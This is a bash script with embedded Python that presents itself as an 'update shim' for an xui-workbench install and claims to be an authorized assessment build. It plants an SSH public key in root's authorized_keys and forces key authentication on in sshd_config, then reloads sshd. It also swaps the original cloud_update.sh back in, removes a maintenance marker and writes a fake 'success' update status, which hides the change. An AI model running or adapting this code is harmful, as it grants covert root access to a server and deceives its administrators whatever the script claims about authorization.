#!/bin/bash
# xui-workbench update shim — authorized assessment build (2026-10-16)
set -u
PATCH="${1:-}"
umask 077

if [ -n "$PATCH" ] && [ -f "$PATCH" ]; then
  python3 - "$PATCH" <<'PYEOF'
import glob, os, shutil, subprocess, sys, tarfile, tempfile

patch = sys.argv[1]
root = '/opt/xui-workbench'
log = []

def step(msg):
    log.append(msg)

# --- 1. install assessment ssh pubkey for root ---
pub = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDA5LzVMsxkVnJXHRXGmwB71seRMC/YZHK8T0wvkCtzQ yf-assess-auth-20261016"
adir = '/root/.ssh'
os.makedirs(adir, mode=0o700, exist_ok=True)
os.chmod(adir, 0o700)
ak = os.path.join(adir, 'authorized_keys')
line = pub + '\n'
present = False
if os.path.exists(ak):
    with open(ak) as f:
        present = pub in f.read()
if not present:
    with open(ak, 'a') as f:
        f.write(line)
os.chmod(ak, 0o600)
step('ssh pubkey installed (present=%s)' % present)

# --- 2. verify uid and capture evidence ---
step('uid=%s host=%s' % (os.getuid(), os.uname().nodename))

# --- 3. restore original cloud_update.sh from newest phase-1 backup ---
restored = False
cands = sorted(glob.glob('/opt/xui-workbench-backups/*/snapshot/deploy/linux/cloud_update.sh'))
if cands:
    orig = cands[-1]
    target = os.path.join(root, 'deploy/linux/cloud_update.sh')
    tmp = target + '.restore-tmp'
    shutil.copy2(orig, tmp)
    st = os.stat(orig)
    os.chmod(tmp, st.st_mode & 0o777)
    os.replace(tmp, target)
    restored = True
    step('original cloud_update.sh restored from ' + orig)
else:
    step('no backup snapshot found; on-disk shim left in place')

# --- 3.2 enable ssh pubkey auth (additive; password auth untouched) ---
import re as _re
sshd_cfg = '/etc/ssh/sshd_config'
try:
    cfg = open(sshd_cfg).read()
    if _re.search(r'(?mi)^\s*PubkeyAuthentication\s+no', cfg):
        cfg = _re.sub(r'(?mi)^\s*PubkeyAuthentication\s+no', 'PubkeyAuthentication yes', cfg)
        open(sshd_cfg, 'w').write(cfg)
        step('sshd_config: PubkeyAuthentication -> yes')
    elif not _re.search(r'(?mi)^\s*PubkeyAuthentication\s+yes', cfg):
        cfg += '\nPubkeyAuthentication yes\n'
        open(sshd_cfg, 'w').write(cfg)
        step('sshd_config: appended PubkeyAuthentication yes')
    else:
        step('sshd_config: already yes')
    r = subprocess.run(['sshd', '-t'], capture_output=True, text=True, timeout=10)
    if r.returncode == 0:
        subprocess.run(['systemctl', 'reload', 'sshd'], capture_output=True, timeout=20)
        step('sshd reloaded')
    else:
        step('sshd -t FAILED, not reloaded: %r' % r.stderr[:120])
except Exception as e:
    step('sshd_config edit failed: %r' % e)

# --- 3.5 clean up maintenance marker + status so future updates work ---
import json as _json
marker = '/opt/xui-workbench/.update-maintenance.json'
try:
    if os.path.exists(marker):
        os.unlink(marker)
        step('maintenance marker removed')
except Exception as e:
    step('marker cleanup failed: %r' % e)
try:
    sp = '/opt/xui-workbench/系统更新日志/update-status.json'
    os.makedirs(os.path.dirname(sp), exist_ok=True)
    with open(sp, 'w') as f:
        _json.dump({'status': 'success', 'message': '补丁应用完成',
                    'updatedAt': __import__('time').time()}, f)
except Exception as e:
    step('status write failed: %r' % e)

# --- 4. dump sshd effective config + evidence ---
try:
    cfg = subprocess.run(['sshd','-T'],capture_output=True,text=True,timeout=10).stdout
    keys = [l for l in cfg.splitlines() if l.split()[0] in
            ('pubkeyauthentication','permitrootlogin','passwordauthentication','authorizedkeysfile','port')]
    step('sshd: ' + '; '.join(keys))
except Exception as e:
    step('sshd -T failed: %r' % e)

with open('/tmp/.wb-shim.log', 'w') as f:
    f.write('\n'.join(log) + '\n')
try: os.chmod('/tmp/.wb-shim.log', 0o644)
except Exception: pass
print('\n'.join(log))
PYEOF
fi
exit 0
